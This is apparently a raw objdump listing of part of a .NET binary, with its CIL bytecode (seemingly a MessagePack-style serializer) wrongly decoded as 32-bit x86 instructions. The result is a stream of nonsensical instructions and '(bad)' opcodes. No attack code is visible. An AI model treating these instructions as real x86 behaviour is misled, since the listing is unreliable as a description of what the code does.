  4046e3:	00 12                	add    %dl,(%edx)
  4046e5:	03 28                	add    (%eax),%ebp
  4046e7:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046ec:	04 06                	add    $0x6,%al
  4046ee:	17                   	pop    %ss
  4046ef:	58                   	pop    %eax
  4046f0:	0a 08                	or     (%eax),%cl
  4046f2:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046f5:	34 00                	xor    $0x0,%al
  4046f7:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046fa:	ed                   	in     (%dx),%eax
  4046fb:	00 00                	add    %al,(%eax)
  4046fd:	0a 39                	or     (%ecx),%bh
  4046ff:	07                   	pop    %es
  404700:	00 00                	add    %al,(%eax)
  404702:	00 06                	add    %al,(%esi)
  404704:	0b dd                	or     %ebp,%ebx
  404706:	1c 00                	sbb    $0x0,%al
  404708:	00 00                	add    %al,(%eax)
  40470a:	12 03                	adc    (%ebx),%al
  40470c:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  404712:	d1 dd                	rcr    $1,%ebp
  404714:	0e                   	push   %cs
  404715:	00 00                	add    %al,(%eax)
  404717:	00 12                	add    %dl,(%edx)
  404719:	03 fe                	add    %esi,%edi
  40471b:	16                   	push   %ss
  40471c:	04 00                	add    $0x0,%al
  40471e:	00 1b                	add    %bl,(%ebx)
  404720:	6f                   	outsl  %ds:(%esi),(%dx)
  404721:	33 00                	xor    (%eax),%eax
  404723:	00 0a                	add    %cl,(%edx)
  404725:	dc 07                	faddl  (%edi)
  404727:	2a 01                	sub    (%ecx),%al
  404729:	10 00                	adc    %al,(%eax)
  40472b:	00 02                	add    %al,(%edx)
  40472d:	00 17                	add    %dl,(%edi)
  40472f:	00 39                	add    %bh,(%ecx)
  404731:	50                   	push   %eax
  404732:	00 0e                	add    %cl,(%esi)
  404734:	00 00                	add    %al,(%eax)
  404736:	00 00                	add    %al,(%eax)
  404738:	13 30                	adc    (%eax),%esi
  40473a:	02 00                	add    (%eax),%al
  40473c:	1e                   	push   %ds
  40473d:	00 00                	add    %al,(%eax)
  40473f:	00 01                	add    %al,(%ecx)
  404741:	00 00                	add    %al,(%eax)
  404743:	11 02                	adc    %eax,(%edx)
  404745:	03 28                	add    (%eax),%ebp
  404747:	6d                   	insl   (%dx),%es:(%edi)
  404748:	00 00                	add    %al,(%eax)
  40474a:	06                   	push   %es
  40474b:	0a 06                	or     (%esi),%al
  40474d:	15 40 02 00 00       	adc    $0x240,%eax
  404752:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  404755:	02 7b 38             	add    0x38(%ebx),%bh
  404758:	00 00                	add    %al,(%eax)
  40475a:	04 06                	add    $0x6,%al
  40475c:	6f                   	outsl  %ds:(%esi),(%dx)
  40475d:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  404764:	13 30                	adc    (%eax),%esi
  404766:	04 00                	add    $0x0,%al
  404768:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  40476d:	00 00                	add    %al,(%eax)
  40476f:	11 02                	adc    %eax,(%edx)
  404771:	7b 38                	jnp    0x4047ab
  404773:	00 00                	add    %al,(%eax)
  404775:	04 6f                	add    $0x6f,%al
  404777:	eb 00                	jmp    0x404779
  404779:	00 0a                	add    %cl,(%edx)
  40477b:	0a 06                	or     (%esi),%al
  40477d:	1f                   	pop    %ds
  40477e:	0f 3d                	(bad)
  404780:	16                   	push   %ss
  404781:	00 00                	add    %al,(%eax)
  404783:	00 20                	add    %ah,(%eax)
  404785:	80 00 00             	addb   $0x0,(%eax)
  404788:	00 06                	add    %al,(%esi)
  40478a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40478d:	0b 03                	or     (%ebx),%eax
  40478f:	07                   	pop    %es
  404790:	6f                   	outsl  %ds:(%esi),(%dx)
  404791:	ee                   	out    %al,(%dx)
  404792:	00 00                	add    %al,(%eax)
  404794:	0a 38                	or     (%eax),%bh
  404796:	59                   	pop    %ecx
  404797:	00 00                	add    %al,(%eax)
  404799:	00 06                	add    %al,(%esi)
  40479b:	20 ff                	and    %bh,%bh
  40479d:	ff 00                	incl   (%eax)
  40479f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  4047a5:	20 de                	and    %bl,%dh
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	00 0b                	add    %cl,(%ebx)
  4047ab:	03 07                	add    (%edi),%eax
  4047ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ae:	ee                   	out    %al,(%dx)
  4047af:	00 00                	add    %al,(%eax)
  4047b1:	0a 06                	or     (%esi),%al
  4047b3:	68 28 ef 00 00       	push   $0xef28
  4047b8:	0a 28                	or     (%eax),%ch
  4047ba:	58                   	pop    %eax
  4047bb:	00 00                	add    %al,(%eax)
  4047bd:	06                   	push   %es
  4047be:	0c 03                	or     $0x3,%al
  4047c0:	08 16                	or     %dl,(%esi)
  4047c2:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c8:	00 0a                	add    %cl,(%edx)
  4047ca:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047cd:	00 00                	add    %al,(%eax)
  4047cf:	20 df                	and    %bl,%bh
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	00 0b                	add    %cl,(%ebx)
  4047d5:	03 07                	add    (%edi),%eax
  4047d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d8:	ee                   	out    %al,(%dx)
  4047d9:	00 00                	add    %al,(%eax)
  4047db:	0a 06                	or     (%esi),%al
  4047dd:	28 4a 00             	sub    %cl,0x0(%edx)
  4047e0:	00 0a                	add    %cl,(%edx)
  4047e2:	28 58 00             	sub    %bl,0x0(%eax)
  4047e5:	00 06                	add    %al,(%esi)
  4047e7:	0c 03                	or     $0x3,%al
  4047e9:	08 16                	or     %dl,(%esi)
  4047eb:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047f1:	00 0a                	add    %cl,(%edx)
  4047f3:	16                   	push   %ss
  4047f4:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f9:	00 03                	add    %al,(%ebx)
  4047fb:	02 7b 38             	add    0x38(%ebx),%bh
  4047fe:	00 00                	add    %al,(%eax)
  404800:	04 09                	add    $0x9,%al
  404802:	6f                   	outsl  %ds:(%esi),(%dx)
  404803:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  40480a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40480d:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  404814:	00 00                	add    %al,(%eax)
  404816:	04 09                	add    $0x9,%al
  404818:	6f                   	outsl  %ds:(%esi),(%dx)
  404819:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404820:	00 00                	add    %al,(%eax)
  404822:	06                   	push   %es
  404823:	09 17                	or     %edx,(%edi)
  404825:	58                   	pop    %eax
  404826:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  40482b:	2a 13                	sub    (%ebx),%dl
  40482d:	30 04 00             	xor    %al,(%eax,%eax,1)
  404830:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404831:	00 00                	add    %al,(%eax)
  404833:	00 1f                	add    %bl,(%edi)
  404835:	00 00                	add    %al,(%eax)
  404837:	11 02                	adc    %eax,(%edx)
  404839:	7b 38                	jnp    0x404873
  40483b:	00 00                	add    %al,(%eax)
  40483d:	04 6f                	add    $0x6f,%al
  40483f:	eb 00                	jmp    0x404841
  404841:	00 0a                	add    %cl,(%edx)
  404843:	0a 06                	or     (%esi),%al
  404845:	1f                   	pop    %ds
  404846:	0f 3d                	(bad)
  404848:	16                   	push   %ss
  404849:	00 00                	add    %al,(%eax)
  40484b:	00 20                	add    %ah,(%eax)
  40484d:	90                   	nop
  40484e:	00 00                	add    %al,(%eax)
  404850:	00 06                	add    %al,(%esi)
  404852:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404855:	0b 03                	or     (%ebx),%eax
  404857:	07                   	pop    %es
  404858:	6f                   	outsl  %ds:(%esi),(%dx)
  404859:	ee                   	out    %al,(%dx)
  40485a:	00 00                	add    %al,(%eax)
  40485c:	0a 38                	or     (%eax),%bh
  40485e:	59                   	pop    %ecx
  40485f:	00 00                	add    %al,(%eax)
  404861:	00 06                	add    %al,(%esi)
  404863:	20 ff                	and    %bh,%bh
  404865:	ff 00                	incl   (%eax)
  404867:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40486d:	20 dc                	and    %bl,%ah
  40486f:	00 00                	add    %al,(%eax)
  404871:	00 0b                	add    %cl,(%ebx)
  404873:	03 07                	add    (%edi),%eax
  404875:	6f                   	outsl  %ds:(%esi),(%dx)
  404876:	ee                   	out    %al,(%dx)
  404877:	00 00                	add    %al,(%eax)
  404879:	0a 06                	or     (%esi),%al
  40487b:	68 28 ef 00 00       	push   $0xef28
  404880:	0a 28                	or     (%eax),%ch
  404882:	58                   	pop    %eax
  404883:	00 00                	add    %al,(%eax)
  404885:	06                   	push   %es
  404886:	0c 03                	or     $0x3,%al
  404888:	08 16                	or     %dl,(%esi)
  40488a:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404890:	00 0a                	add    %cl,(%edx)
  404892:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  404895:	00 00                	add    %al,(%eax)
  404897:	20 dd                	and    %bl,%ch
  404899:	00 00                	add    %al,(%eax)
  40489b:	00 0b                	add    %cl,(%ebx)
  40489d:	03 07                	add    (%edi),%eax
  40489f:	6f                   	outsl  %ds:(%esi),(%dx)
  4048a0:	ee                   	out    %al,(%dx)
  4048a1:	00 00                	add    %al,(%eax)
  4048a3:	0a 06                	or     (%esi),%al
  4048a5:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a8:	00 0a                	add    %cl,(%edx)
  4048aa:	28 58 00             	sub    %bl,0x0(%eax)
  4048ad:	00 06                	add    %al,(%esi)
  4048af:	0c 03                	or     $0x3,%al
  4048b1:	08 16                	or     %dl,(%esi)
  4048b3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b9:	00 0a                	add    %cl,(%edx)
  4048bb:	16                   	push   %ss
  4048bc:	0d 38 16 00 00       	or     $0x1638,%eax
  4048c1:	00 02                	add    %al,(%edx)
  4048c3:	7b 38                	jnp    0x4048fd
  4048c5:	00 00                	add    %al,(%eax)
  4048c7:	04 09                	add    $0x9,%al
  4048c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4048ca:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048d1:	00 00                	add    %al,(%eax)
  4048d3:	06                   	push   %es
  4048d4:	09 17                	or     %edx,(%edi)
  4048d6:	58                   	pop    %eax
  4048d7:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048dc:	2a 00                	sub    (%eax),%al
  4048de:	00 00                	add    %al,(%eax)
  4048e0:	13 30                	adc    (%eax),%esi
  4048e2:	02 00                	add    (%eax),%al
  4048e4:	99                   	cltd
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	00 20                	add    %ah,(%eax)
  4048e9:	00 00                	add    %al,(%eax)
  4048eb:	11 02                	adc    %eax,(%edx)
  4048ed:	7b 36                	jnp    0x404925
  4048ef:	00 00                	add    %al,(%eax)
  4048f1:	04 0a                	add    $0xa,%al
  4048f3:	06                   	push   %es
  4048f4:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048f7:	07                   	pop    %es
  4048f8:	00 00                	add    %al,(%eax)
  4048fa:	00 22                	add    %ah,(%edx)
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 05 00 00 00 16    	add    %al,0x16000000
  404904:	00 00                	add    %al,(%eax)
  404906:	00 6b 00             	add    %ch,0x0(%ebx)
  404909:	00 00                	add    %al,(%eax)
  40490b:	38 00                	cmp    %al,(%eax)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	49                   	dec    %ecx
  404910:	00 00                	add    %al,(%eax)
  404912:	00 5a 00             	add    %bl,0x0(%edx)
  404915:	00 00                	add    %al,(%eax)
  404917:	38 66 00             	cmp    %ah,0x0(%esi)
  40491a:	00 00                	add    %al,(%eax)
  40491c:	02 7b 35             	add    0x35(%ebx),%bh
  40491f:	00 00                	add    %al,(%eax)
  404921:	04 a5                	add    $0xa5,%al
  404923:	68 00 00 01 28       	push   $0x28010000
  404928:	f0 00 00             	lock add %al,(%eax)
  40492b:	0a 2a                	or     (%edx),%ch
  40492d:	02 7b 35             	add    0x35(%ebx),%bh
  404930:	00 00                	add    %al,(%eax)
  404932:	04 a5                	add    $0xa5,%al
  404934:	95                   	xchg   %eax,%ebp
  404935:	00 00                	add    %al,(%eax)
  404937:	01 2a                	add    %ebp,(%edx)
  404939:	02 7b 35             	add    0x35(%ebx),%bh
  40493c:	00 00                	add    %al,(%eax)
  40493e:	04 6f                	add    $0x6f,%al
  404940:	38 00                	cmp    %al,(%eax)
  404942:	00 0a                	add    %cl,(%edx)
  404944:	6f                   	outsl  %ds:(%esi),(%dx)
  404945:	f1                   	int1
  404946:	00 00                	add    %al,(%eax)
  404948:	0a 28                	or     (%eax),%ch
  40494a:	f2 00 00             	repnz add %al,(%eax)
  40494d:	0a 2a                	or     (%edx),%ch
  40494f:	02 7b 35             	add    0x35(%ebx),%bh
  404952:	00 00                	add    %al,(%eax)
  404954:	04 a5                	add    $0xa5,%al
  404956:	96                   	xchg   %eax,%esi
  404957:	00 00                	add    %al,(%eax)
  404959:	01 28                	add    %ebp,(%eax)
  40495b:	f3 00 00             	repz add %al,(%eax)
  40495e:	0a 2a                	or     (%edx),%ch
  404960:	02 7b 35             	add    0x35(%ebx),%bh
  404963:	00 00                	add    %al,(%eax)
  404965:	04 a5                	add    $0xa5,%al
  404967:	97                   	xchg   %eax,%edi
  404968:	00 00                	add    %al,(%eax)
  40496a:	01 28                	add    %ebp,(%eax)
  40496c:	f4                   	hlt
  40496d:	00 00                	add    %al,(%eax)
  40496f:	0a 2a                	or     (%edx),%ch
  404971:	02 7b 35             	add    0x35(%ebx),%bh
  404974:	00 00                	add    %al,(%eax)
  404976:	04 a5                	add    $0xa5,%al
  404978:	6b 00 00             	imul   $0x0,(%eax),%eax
  40497b:	01 28                	add    %ebp,(%eax)
  40497d:	f5                   	cmc
  40497e:	00 00                	add    %al,(%eax)
  404980:	0a 2a                	or     (%edx),%ch
  404982:	16                   	push   %ss
  404983:	6a 2a                	push   $0x2a
  404985:	00 00                	add    %al,(%eax)
  404987:	00 13                	add    %dl,(%ebx)
  404989:	30 02                	xor    %al,(%edx)
  40498b:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404991:	00 00                	add    %al,(%eax)
  404993:	11 02                	adc    %eax,(%edx)
  404995:	7b 36                	jnp    0x4049cd
  404997:	00 00                	add    %al,(%eax)
  404999:	04 0a                	add    $0xa,%al
  40499b:	06                   	push   %es
  40499c:	1a 59 45             	sbb    0x45(%ecx),%bl
  40499f:	07                   	pop    %es
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	00 22                	add    %ah,(%edx)
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 05 00 00 00 11    	add    %al,0x11000000
  4049ac:	00 00                	add    %al,(%eax)
  4049ae:	00 6b 00             	add    %ch,0x0(%ebx)
  4049b1:	00 00                	add    %al,(%eax)
  4049b3:	38 00                	cmp    %al,(%eax)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	49                   	dec    %ecx
  4049b8:	00 00                	add    %al,(%eax)
  4049ba:	00 5a 00             	add    %bl,0x0(%edx)
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	38 66 00             	cmp    %ah,0x0(%esi)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	02 7b 35             	add    0x35(%ebx),%bh
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	04 a5                	add    $0xa5,%al
  4049cb:	68 00 00 01 2a       	push   $0x2a010000
  4049d0:	02 7b 35             	add    0x35(%ebx),%bh
  4049d3:	00 00                	add    %al,(%eax)
  4049d5:	04 a5                	add    $0xa5,%al
  4049d7:	68 00 00 01 28       	push   $0x28010000
  4049dc:	f6 00 00             	testb  $0x0,(%eax)
  4049df:	0a 2a                	or     (%edx),%ch
  4049e1:	02 7b 35             	add    0x35(%ebx),%bh
  4049e4:	00 00                	add    %al,(%eax)
  4049e6:	04 6f                	add    $0x6f,%al
  4049e8:	38 00                	cmp    %al,(%eax)
  4049ea:	00 0a                	add    %cl,(%edx)
  4049ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4049ed:	f1                   	int1
  4049ee:	00 00                	add    %al,(%eax)
  4049f0:	0a 28                	or     (%eax),%ch
  4049f2:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f8:	7b 35                	jnp    0x404a2f
  4049fa:	00 00                	add    %al,(%eax)
  4049fc:	04 a5                	add    $0xa5,%al
  4049fe:	96                   	xchg   %eax,%esi
  4049ff:	00 00                	add    %al,(%eax)
  404a01:	01 28                	add    %ebp,(%eax)
  404a03:	f8                   	clc
  404a04:	00 00                	add    %al,(%eax)
  404a06:	0a 2a                	or     (%edx),%ch
  404a08:	02 7b 35             	add    0x35(%ebx),%bh
  404a0b:	00 00                	add    %al,(%eax)
  404a0d:	04 a5                	add    $0xa5,%al
  404a0f:	97                   	xchg   %eax,%edi
  404a10:	00 00                	add    %al,(%eax)
  404a12:	01 28                	add    %ebp,(%eax)
  404a14:	f9                   	stc
  404a15:	00 00                	add    %al,(%eax)
  404a17:	0a 2a                	or     (%edx),%ch
  404a19:	02 7b 35             	add    0x35(%ebx),%bh
  404a1c:	00 00                	add    %al,(%eax)
  404a1e:	04 a5                	add    $0xa5,%al
  404a20:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a23:	01 28                	add    %ebp,(%eax)
  404a25:	fa                   	cli
  404a26:	00 00                	add    %al,(%eax)
  404a28:	0a 2a                	or     (%edx),%ch
  404a2a:	16                   	push   %ss
  404a2b:	6a 2a                	push   $0x2a
  404a2d:	00 00                	add    %al,(%eax)
  404a2f:	00 13                	add    %dl,(%ebx)
  404a31:	30 02                	xor    %al,(%edx)
  404a33:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a39:	00 00                	add    %al,(%eax)
  404a3b:	11 02                	adc    %eax,(%edx)
  404a3d:	7b 36                	jnp    0x404a75
  404a3f:	00 00                	add    %al,(%eax)
  404a41:	04 0a                	add    $0xa,%al
  404a43:	06                   	push   %es
  404a44:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a47:	07                   	pop    %es
  404a48:	00 00                	add    %al,(%eax)
  404a4a:	00 16                	add    %dl,(%esi)
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 05 00 00 00 52    	add    %al,0x52000000
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 52 00             	add    %dl,0x0(%edx)
  404a59:	00 00                	add    %al,(%eax)
  404a5b:	27                   	daa
  404a5c:	00 00                	add    %al,(%eax)
  404a5e:	00 33                	add    %dh,(%ebx)
  404a60:	00 00                	add    %al,(%eax)
  404a62:	00 40 00             	add    %al,0x0(%eax)
  404a65:	00 00                	add    %al,(%eax)
  404a67:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	02 7b 35             	add    0x35(%ebx),%bh
  404a6f:	00 00                	add    %al,(%eax)
  404a71:	04 a5                	add    $0xa5,%al
  404a73:	68 00 00 01 28       	push   $0x28010000
  404a78:	fb                   	sti
  404a79:	00 00                	add    %al,(%eax)
  404a7b:	0a 2a                	or     (%edx),%ch
  404a7d:	02 7b 35             	add    0x35(%ebx),%bh
  404a80:	00 00                	add    %al,(%eax)
  404a82:	04 74                	add    $0x74,%al
  404a84:	38 00                	cmp    %al,(%eax)
  404a86:	00 01                	add    %al,(%ecx)
  404a88:	28 fc                	sub    %bh,%ah
  404a8a:	00 00                	add    %al,(%eax)
  404a8c:	0a 2a                	or     (%edx),%ch
  404a8e:	02 7b 35             	add    0x35(%ebx),%bh
  404a91:	00 00                	add    %al,(%eax)
  404a93:	04 a5                	add    $0xa5,%al
  404a95:	96                   	xchg   %eax,%esi
  404a96:	00 00                	add    %al,(%eax)
  404a98:	01 2a                	add    %ebp,(%edx)
  404a9a:	02 7b 35             	add    0x35(%ebx),%bh
  404a9d:	00 00                	add    %al,(%eax)
  404a9f:	04 a5                	add    $0xa5,%al
  404aa1:	97                   	xchg   %eax,%edi
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa8:	7b 35                	jnp    0x404adf
  404aaa:	00 00                	add    %al,(%eax)
  404aac:	04 a5                	add    $0xa5,%al
  404aae:	6b 00 00             	imul   $0x0,(%eax),%eax
  404ab1:	01 28                	add    %ebp,(%eax)
  404ab3:	fa                   	cli
  404ab4:	00 00                	add    %al,(%eax)
  404ab6:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404ac2:	2a 00                	sub    (%eax),%al
  404ac4:	13 30                	adc    (%eax),%esi
  404ac6:	02 00                	add    (%eax),%al
  404ac8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac9:	00 00                	add    %al,(%eax)
  404acb:	00 21                	add    %ah,(%ecx)
  404acd:	00 00                	add    %al,(%eax)
  404acf:	11 02                	adc    %eax,(%edx)
  404ad1:	7b 36                	jnp    0x404b09
  404ad3:	00 00                	add    %al,(%eax)
  404ad5:	04 0a                	add    $0xa,%al
  404ad7:	06                   	push   %es
  404ad8:	1a 59 45             	sbb    0x45(%ecx),%bl
  404adb:	08 00                	or     %al,(%eax)
  404add:	00 00                	add    %al,(%eax)
  404adf:	16                   	push   %ss
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 6e 00             	add    %ch,0x0(%esi)
  404aed:	00 00                	add    %al,(%eax)
  404aef:	27                   	daa
  404af0:	00 00                	add    %al,(%eax)
  404af2:	00 38                	add    %bh,(%eax)
  404af4:	00 00                	add    %al,(%eax)
  404af6:	00 49 00             	add    %cl,0x0(%ecx)
  404af9:	00 00                	add    %al,(%eax)
  404afb:	62 00                	bound  %eax,(%eax)
  404afd:	00 00                	add    %al,(%eax)
  404aff:	38 69 00             	cmp    %ch,0x0(%ecx)
  404b02:	00 00                	add    %al,(%eax)
  404b04:	02 7b 35             	add    0x35(%ebx),%bh
  404b07:	00 00                	add    %al,(%eax)
  404b09:	04 a5                	add    $0xa5,%al
  404b0b:	68 00 00 01 28       	push   $0x28010000
  404b10:	e7 00                	out    %eax,$0x0
  404b12:	00 0a                	add    %cl,(%edx)
  404b14:	2a 02                	sub    (%edx),%al
  404b16:	7b 35                	jnp    0x404b4d
  404b18:	00 00                	add    %al,(%eax)
  404b1a:	04 6f                	add    $0x6f,%al
  404b1c:	38 00                	cmp    %al,(%eax)
  404b1e:	00 0a                	add    %cl,(%edx)
  404b20:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b24:	06                   	push   %es
  404b25:	2a 02                	sub    (%edx),%al
  404b27:	7b 35                	jnp    0x404b5e
  404b29:	00 00                	add    %al,(%eax)
  404b2b:	04 a5                	add    $0xa5,%al
  404b2d:	96                   	xchg   %eax,%esi
  404b2e:	00 00                	add    %al,(%eax)
  404b30:	01 28                	add    %ebp,(%eax)
  404b32:	e8 00 00 0a 2a       	call   0x2a4a4b37
  404b37:	02 7b 35             	add    0x35(%ebx),%bh
  404b3a:	00 00                	add    %al,(%eax)
  404b3c:	04 a5                	add    $0xa5,%al
  404b3e:	97                   	xchg   %eax,%edi
  404b3f:	00 00                	add    %al,(%eax)
  404b41:	01 28                	add    %ebp,(%eax)
  404b43:	fd                   	std
  404b44:	00 00                	add    %al,(%eax)
  404b46:	0a 2a                	or     (%edx),%ch
  404b48:	02 7b 35             	add    0x35(%ebx),%bh
  404b4b:	00 00                	add    %al,(%eax)
  404b4d:	04 a5                	add    $0xa5,%al
  404b4f:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b52:	01 0b                	add    %ecx,(%ebx)
  404b54:	12 01                	adc    (%ecx),%al
  404b56:	28 fe                	sub    %bh,%dh
  404b58:	00 00                	add    %al,(%eax)
  404b5a:	0a 28                	or     (%eax),%ch
  404b5c:	e7 00                	out    %eax,$0x0
  404b5e:	00 0a                	add    %cl,(%edx)
  404b60:	2a 02                	sub    (%edx),%al
  404b62:	7b 35                	jnp    0x404b99
  404b64:	00 00                	add    %al,(%eax)
  404b66:	04 74                	add    $0x74,%al
  404b68:	02 00                	add    (%eax),%al
  404b6a:	00 1b                	add    %bl,(%ebx)
  404b6c:	2a 16                	sub    (%esi),%dl
  404b6e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b72:	01 2a                	add    %ebp,(%edx)
  404b74:	13 30                	adc    (%eax),%esi
  404b76:	04 00                	add    $0x0,%al
  404b78:	4b                   	dec    %ebx
  404b79:	00 00                	add    %al,(%eax)
  404b7b:	00 22                	add    %ah,(%edx)
  404b7d:	00 00                	add    %al,(%eax)
  404b7f:	11 03                	adc    %eax,(%ebx)
  404b81:	28 6a 00             	sub    %ch,0x0(%edx)
  404b84:	00 0a                	add    %cl,(%edx)
  404b86:	39 3e                	cmp    %edi,(%esi)
  404b88:	00 00                	add    %al,(%eax)
  404b8a:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b8d:	03 19                	add    (%ecx),%ebx
  404b8f:	17                   	pop    %ss
  404b90:	17                   	pop    %ss
  404b91:	73 ff                	jae    0x404b92
  404b93:	00 00                	add    %al,(%eax)
  404b95:	0a 0b                	or     (%ebx),%cl
  404b97:	07                   	pop    %es
  404b98:	6f                   	outsl  %ds:(%esi),(%dx)
  404b99:	e2 00                	loop   0x404b9b
  404b9b:	00 0a                	add    %cl,(%edx)
  404b9d:	d4 8d                	aam    $0x8d
  404b9f:	44                   	inc    %esp
  404ba0:	00 00                	add    %al,(%eax)
  404ba2:	01 0a                	add    %ecx,(%edx)
  404ba4:	07                   	pop    %es
  404ba5:	06                   	push   %es
  404ba6:	16                   	push   %ss
  404ba7:	07                   	pop    %es
  404ba8:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba9:	e2 00                	loop   0x404bab
  404bab:	00 0a                	add    %cl,(%edx)
  404bad:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bb4:	07                   	pop    %es
  404bb5:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb6:	9f                   	lahf
  404bb7:	00 00                	add    %al,(%eax)
  404bb9:	0a 07                	or     (%edi),%al
  404bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  404bbc:	40                   	inc    %eax
  404bbd:	00 00                	add    %al,(%eax)
  404bbf:	0a 02                	or     (%edx),%al
  404bc1:	06                   	push   %es
  404bc2:	28 79 00             	sub    %bh,0x0(%ecx)
  404bc5:	00 06                	add    %al,(%esi)
  404bc7:	17                   	pop    %ss
  404bc8:	2a 16                	sub    (%esi),%dl
  404bca:	2a 00                	sub    (%eax),%al
  404bcc:	13 30                	adc    (%eax),%esi
  404bce:	05 00 40 00 00       	add    $0x4000,%eax
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	00 02                	add    %al,(%edx)
  404bd9:	7b 35                	jnp    0x404c10
  404bdb:	00 00                	add    %al,(%eax)
  404bdd:	04 39                	add    $0x39,%al
  404bdf:	33 00                	xor    (%eax),%eax
  404be1:	00 00                	add    %al,(%eax)
  404be3:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404be6:	6c                   	insb   (%dx),%es:(%edi)
  404be7:	00 00                	add    %al,(%eax)
  404be9:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404bef:	00 04 74             	add    %al,(%esp,%esi,2)
  404bf2:	02 00                	add    (%eax),%al
  404bf4:	00 1b                	add    %bl,(%ebx)
  404bf6:	16                   	push   %ss
  404bf7:	02 7b 35             	add    0x35(%ebx),%bh
  404bfa:	00 00                	add    %al,(%eax)
  404bfc:	04 74                	add    $0x74,%al
  404bfe:	02 00                	add    (%eax),%al
  404c00:	00 1b                	add    %bl,(%ebx)
  404c02:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404c05:	4c                   	dec    %esp
  404c06:	00 00                	add    %al,(%eax)
  404c08:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c0e:	0a 6f 40             	or     0x40(%edi),%ch
  404c11:	00 00                	add    %al,(%eax)
  404c13:	0a 17                	or     (%edi),%dl
  404c15:	2a 16                	sub    (%esi),%dl
  404c17:	2a 13                	sub    (%ebx),%dl
  404c19:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c1c:	af                   	scas   %es:(%edi),%eax
  404c1d:	00 00                	add    %al,(%eax)
  404c1f:	00 23                	add    %ah,(%ebx)
  404c21:	00 00                	add    %al,(%eax)
  404c23:	11 02                	adc    %eax,(%edx)
  404c25:	0a 03                	or     (%ebx),%al
  404c27:	6f                   	outsl  %ds:(%esi),(%dx)
  404c28:	f1                   	int1
  404c29:	00 00                	add    %al,(%eax)
  404c2b:	0a 19                	or     (%ecx),%bl
  404c2d:	8d 39                	lea    (%ecx),%edi
  404c2f:	00 00                	add    %al,(%eax)
  404c31:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c37:	04 28                	add    $0x28,%al
  404c39:	e4 00                	in     $0x0,%al
  404c3b:	00 0a                	add    %cl,(%edx)
  404c3d:	6f                   	outsl  %ds:(%esi),(%dx)
